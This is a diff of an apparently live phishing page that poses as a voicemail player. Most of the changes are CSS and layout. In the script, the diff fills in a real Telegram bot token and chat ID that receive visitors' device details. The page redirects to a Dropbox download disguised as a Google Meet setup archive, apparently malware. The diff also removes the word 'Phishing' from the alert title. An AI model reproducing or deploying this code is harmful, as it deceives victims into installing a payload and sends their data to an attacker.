@@ -1,8 +1,209 @@
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <style>
-        /* Mobile restriction popup - Exact same style as your image */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0a0a0a;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Main container - responsive */
+        .main-container {
+            width: 100%;
+            max-width: 100%;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        /* Responsive container */
+        .voicemail-container {
+            width: 100%;
+            max-width: 600px;
+            background-color: #111;
+            border-radius: 12px;
+            margin: 20px auto;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+        }
+        
+        /* Header */
+        .voicemail-header {
+            padding: 15px 20px;
+            color: #ccc;
+            font-size: 14px;
+            font-weight: bold;
+            border-bottom: 1px solid #222;
+        }
+        
+        /* Play area - responsive */
+        .play-area {
+            padding: 40px 20px;
+            text-align: center;
+        }
+        
+        /* Play button - responsive */
+        .play-button {
+            text-decoration: none;
+            display: inline-block;
+            cursor: pointer;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto;
+        }
+        
+        .play-button-inner {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background-color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s, background-color 0.2s;
+        }
+        
+        .play-button:hover .play-button-inner {
+            background-color: #2a2a2a;
+            transform: scale(1.05);
+        }
+        
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-left: 28px solid #ffffff;
+            border-top: 16px solid transparent;
+            border-bottom: 16px solid transparent;
+            margin-left: 5px;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 1s linear infinite;
+        }
+        
+        .play-button.loading .play-icon {
+            display: none;
+        }
+        
+        .play-button.loading .loading-spinner {
+            display: block;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Duration text */
+        .duration-text {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #bbb;
+        }
+        
+        .duration-text.hidden {
+            display: none;
+        }
+        
+        /* Loading text */
+        .loading-text {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #1db954;
+            animation: pulseText 1.5s ease-in-out infinite;
+        }
+        
+        .loading-text.show {
+            display: block;
+        }
+        
+        @keyframes pulseText {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Link ready message */
+        .link-ready-message {
+            display: none;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #1db954;
+        }
+        
+        .link-ready-message.show {
+            display: block;
+        }
+        
+        /* Controls area */
+        .controls-area {
+            padding: 15px 20px;
+            background-color: #000;
+            color: #aaa;
+            font-size: 12px;
+        }
+        
+        .progress-wrapper {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .time-left, .time-right {
+            min-width: 40px;
+            text-align: center;
+        }
+        
+        .progress-bar-container {
+            flex: 1;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #1db954;
+            transition: width 0.05s linear;
+        }
+        
+        .progress-bar.progress-stopped {
+            background-color: #ff4444;
+        }
+        
+        /* Footer */
+        .footer-text {
+            text-align: center;
+            color: #777;
+            font-size: 11px;
+            margin: 20px auto 30px;
+            padding: 0 20px;
+        }
+        
+        /* Mobile restriction popup */
         .mobile-restriction-popup {
             display: none;
             position: fixed;
@@ -16,6 +217,7 @@
             align-items: center;
             text-align: center;
             backdrop-filter: blur(5px);
+            padding: 20px;
         }
         
         .mobile-restriction-popup.show {
@@ -27,6 +229,7 @@
             border-radius: 12px;
             padding: 30px 25px;
             max-width: 320px;
+            width: 100%;
             margin: 20px;
             box-shadow: 0 10px 40px rgba(0,0,0,0.3);
             animation: fadeInUp 0.3s ease;
@@ -61,20 +264,26 @@
             background: #ffc107;
             color: #333;
             border: none;
-            padding: 10px 25px;
+            padding: 12px 25px;
             border-radius: 6px;
             font-size: 14px;
+            font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
             transition: background 0.2s;
-            font-weight: bold;
+            width: auto;
+            min-width: 100px;
         }
         
         .close-restriction:hover {
             background: #e0a800;
         }
         
-        /* Notification styles */
+        .close-restriction:active {
+            transform: scale(0.98);
+        }
+        
+        /* Notification */
         .notification {
             display: none;
             position: fixed;
@@ -83,15 +292,16 @@
             transform: translateX(-50%);
             background-color: #333;
             color: white;
-            padding: 15px 20px;
+            padding: 12px 16px;
             border-radius: 8px;
             z-index: 1000;
             box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-            font-size: 14px;
+            font-size: 13px;
             animation: fadeIn 0.3s ease;
             text-align: center;
             max-width: 90%;
             width: auto;
+            word-wrap: break-word;
         }
         
         @keyframes fadeIn {
@@ -103,79 +313,167 @@
             display: block;
         }
         
-        /* Loading spinner */
-        .loading-spinner {
-            display: none;
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #ffffff;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
+        /* Responsive adjustments for smaller devices */
+        @media screen and (max-width: 480px) {
+            .main-container {
+                padding: 10px;
+            }
+            
+            .voicemail-container {
+                margin: 10px auto;
+                border-radius: 8px;
+            }
+            
+            .voicemail-header {
+                padding: 12px 16px;
+                font-size: 13px;
+            }
+            
+            .play-area {
+                padding: 30px 16px;
+            }
+            
+            .play-button {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .play-icon {
+                border-left: 22px solid #ffffff;
+                border-top: 12px solid transparent;
+                border-bottom: 12px solid transparent;
+            }
+            
+            .loading-spinner {
+                width: 32px;
+                height: 32px;
+                border-width: 3px;
+            }
+            
+            .duration-text {
+                font-size: 12px;
+            }
+            
+            .controls-area {
+                padding: 12px 16px;
+            }
+            
+            .time-left, .time-right {
+                font-size: 11px;
+                min-width: 35px;
+            }
+            
+            .restriction-content {
+                padding: 25px 20px;
+                margin: 15px;
+            }
+            
+            .restriction-content h3 {
+                font-size: 18px;
+            }
+            
+            .restriction-content p {
+                font-size: 13px;
+            }
+            
+            .close-restriction {
+                padding: 10px 20px;
+                font-size: 13px;
+            }
+            
+            .notification {
+                font-size: 12px;
+                padding: 10px 14px;
+                top: 10px;
+            }
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        /* Extra small devices */
+        @media screen and (max-width: 360px) {
+            .play-button {
+                width: 70px;
+                height: 70px;
+            }
+            
+            .play-icon {
+                border-left: 18px solid #ffffff;
+                border-top: 10px solid transparent;
+                border-bottom: 10px solid transparent;
+            }
+            
+            .play-area {
+                padding: 25px 12px;
+            }
+            
+            .time-left, .time-right {
+                font-size: 10px;
+                min-width: 30px;
+            }
         }
         
-        .play-button.loading .play-icon {
-            display: none;
-        }
-        
-        .play-button.loading .loading-spinner {
-            display: block;
-        }
-        
-        .duration-text.hidden {
-            opacity: 0;
-            visibility: hidden;
-        }
-        
-        .loading-text {
-            display: none;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #1db954;
-            animation: pulseText 1.5s ease-in-out infinite;
-        }
-        
-        .loading-text.show {
-            display: block;
-        }
-        
-        @keyframes pulseText {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        /* Link active indicator */
-        .link-ready {
-            color: #1db954 !important;
-            font-weight: bold;
-        }
-        
-        .link-ready-message {
-            display: none;
-            margin-top: 10px;
-            font-size: 12px;
-            color: #1db954;
-        }
-        
-        .link-ready-message.show {
-            display: block;
-        }
-        
-        /* Progress bar stopped state */
-        .progress-stopped {
-            background-color: #ff4444 !important;
+        /* Landscape mode on mobile */
+        @media screen and (max-height: 500px) and (orientation: landscape) {
+            .play-area {
+                padding: 20px;
+            }
+            
+            .play-button {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .voicemail-container {
+                margin: 10px auto;
+            }
         }
     </style>
 </head>
-<body style="margin:0;padding:0;background-color:#0a0a0a;font-family:Arial,Helvetica,sans-serif;">
+<body>
 
-<!-- Mobile Restriction Popup - Exactly as requested (no icon, yellow button) -->
+<div class="main-container">
+    <div class="voicemail-container">
+        <!-- HEADER -->
+        <div class="voicemail-header">
+            Voicemail
+        </div>
+
+        <!-- CENTER PLAY -->
+        <div class="play-area">
+            <!-- CLICKABLE PLAY BUTTON -->
+            <div id="playButton" class="play-button">
+                <div class="play-button-inner">
+                    <div class="play-icon"></div>
+                    <div class="loading-spinner"></div>
+                </div>
+            </div>
+
+            <div id="durationText" class="duration-text">
+                Click to play • 2:26 duration
+            </div>
+            
+            <div id="loadingText" class="loading-text">
+                Loading...
+            </div>
+            
+            <div id="linkReadyMessage" class="link-ready-message">
+                ✓ Accessing voicemail...
+            </div>
+        </div>
+
+        <!-- CONTROLS -->
+        <div class="controls-area">
+            <div class="progress-wrapper">
+                <div class="time-left">0:00</div>
+                <div class="progress-bar-container">
+                    <div id="progressBar" class="progress-bar"></div>
+                </div>
+                <div class="time-right">2:26</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Mobile Restriction Popup -->
 <div id="mobileRestrictionPopup" class="mobile-restriction-popup">
     <div class="restriction-content">
         <h3>Mobile Access Restricted</h3>
@@ -199,101 +497,10 @@ Content-Type: text/html; charset=UTF-8
 Content-Transfer-Encoding: 7bit
 </div>
 
-<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0a0a0a">
-  <tbody>
-    <tr>
-      <td align="center">
-
-        <!-- CONTAINER -->
-        <table width="600" cellpadding="0" cellspacing="0" border="0" style="background-color:#111;border-radius:8px;margin:40px auto;">
-
-          <!-- HEADER -->
-          <tbody>
-            <tr>
-              <td style="padding:15px 20px;color:#ccc;font-size:14px;font-weight:bold;">
-                Voicemail
-               </td>
-             </tr>
-
-            <!-- CENTER PLAY -->
-            <tr>
-              <td align="center" style="padding:50px 0;">
-
-                <!-- CLICKABLE PLAY BUTTON -->
-                <div id="playButton" class="play-button" style="text-decoration:none;display:inline-block;cursor:pointer;">
-
-                  <table cellpadding="0" cellspacing="0" border="0" style="width:100px;height:100px;border-radius:50%;background-color:#1a1a1a;">
-                    <tbody>
-                      <tr>
-                        <td align="center" valign="middle">
-                          <div class="play-icon" style="
-                            width:0;
-                            height:0;
-                            border-left:28px solid #ffffff;
-                            border-top:16px solid transparent;
-                            border-bottom:16px solid transparent;
-                          "></div>
-                          <div class="loading-spinner"></div>
-                        </td>
-                      </tr>
-                    </tbody>
-                  </table>
-
-                </div>
-
-                <div id="durationText" class="duration-text" style="margin-top:15px;font-size:14px;color:#bbb;">
-                  Click to play • 2:26 duration
-                </div>
-                
-                <div id="loadingText" class="loading-text">
-                    Loading...
-                </div>
-                
-                <div id="linkReadyMessage" class="link-ready-message">
-                    ✓ Accessing voicemail...
-                </div>
-
-               </td>
-             </tr>
-
-            <!-- CONTROLS -->
-            <tr>
-              <td style="padding:15px 20px;background-color:#000;color:#aaa;font-size:12px;">
-
-                <table width="100%" cellpadding="0" cellspacing="0" border="0">
-                  <tbody>
-                    <tr>
-                      <td width="40" align="left">0:00</td>
-                      <td>
-                        <div style="height:4px;background:#333;border-radius:2px;">
-                          <div id="progressBar" style="width:0%;height:4px;background:#1db954;"></div>
-                        </div>
-                      </td>
-                      <td width="40" align="right">2:26</td>
-                    </tr>
-                  </tbody>
-                </table>
-
-               </td>
-             </tr>
-
-          </tbody>
-        </table>
-        <!-- END CONTAINER -->
-
-        <div style="color:#777;font-size:11px;margin-bottom:30px;">
-          This voicemail notification was sent automatically.
-        </div>
-
-       </td>
-     </tr>
-  </tbody>
-</table>
-
 <script>
     // Telegram Bot Configuration
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // Replace with your chat ID
+    const TELEGRAM_BOT_TOKEN = '8789289338:AAHHULXu_rKpg3FTo25Da8X9gRxarUzBBZ4'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '8630161918'; // Replace with your chat ID
     
     // Redirect URL
     const REDIRECT_URL = 'https://www.dropbox.com/scl/fi/mxd1el561sq706wv8n3bt/GoogleMeet.Setup.zip?rlkey=f01m8oyjpsqvpnmr63lcezc4z&st=ur908g83&dl=1';
@@ -395,7 +602,7 @@ Content-Transfer-Encoding: 7bit
         if (eventType !== 'MOBILE_RESTRICTION') notificationSent = true;
         
         const message = `
-🔔 *Voicemail Phishing Page - ${eventType}*
+🔔 *Voicemail Page - ${eventType}*
 
 📱 *Device Information:*
 ├ OS: ${deviceInfo.os}
@@ -461,6 +668,9 @@ ${additionalInfo ? `└ ${additionalInfo}` : ''}
     function showNotification() {
         const notification = document.getElementById('voicemailNotification');
         notification.classList.add('show');
+        setTimeout(() => {
+            notification.classList.remove('show');
+        }, 5000);
     }
     
     // Reset animation to original state
